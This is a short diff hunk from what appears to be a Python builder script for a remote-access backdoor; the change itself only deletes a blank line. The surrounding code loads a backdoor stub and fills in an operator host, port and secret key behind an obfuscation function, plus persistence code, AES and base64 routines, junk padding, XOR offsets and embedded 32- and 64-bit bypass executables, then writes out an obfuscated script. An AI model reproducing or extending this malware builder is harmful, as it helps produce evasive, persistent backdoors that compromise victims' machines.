@@ -123,7 +123,6 @@ with open('base64/86', 'rb') as exe86:
 with open('base64/64', 'rb') as exe64:
 	bypass64 = "bypass64exe = '%s'" % (exe64.read())
 
-
 with open('stubs/backdoor.py', 'rb') as finalbackdoor:
 	readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', "funrot('" + frot(hostname) + "')").replace('***PORT***', "funrot('" + frot(portnumber) + "')").replace('***SECRET***', "funrot('" + frot(secretkey) + "')").replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***ENV***', envvar).replace('***B64E***',be64var).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2).replace('***XOR***', '%s[%s:%s]' % (junkvar, xoroffset, xoroffset + 1000)).replace('***URLO***', urlvar)
 with open('tempobfs.py', 'wb') as o:
